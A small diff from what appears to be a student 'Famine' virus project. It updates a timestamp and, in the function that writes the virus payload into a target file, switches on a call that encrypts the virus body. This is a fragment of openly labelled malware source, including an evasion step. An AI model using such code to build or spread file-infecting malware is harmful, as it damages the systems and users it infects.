@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/05/11 00:10:33 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/11 20:26:49 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/11 20:30:05 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -93,7 +93,7 @@ bool		setup_payload(const struct entry *clone_entry, const struct safe_pointer i
 
 	ft_memcpy(payload_location, (void *)famine_entry, payload_size);
 	ft_memcpy(constants_location, &constants, sizeof(constants));
-	// cypher(virus_location, virus_size); // TODO uncomment
+	cypher(virus_location, virus_size);
 
 	return true;
 }
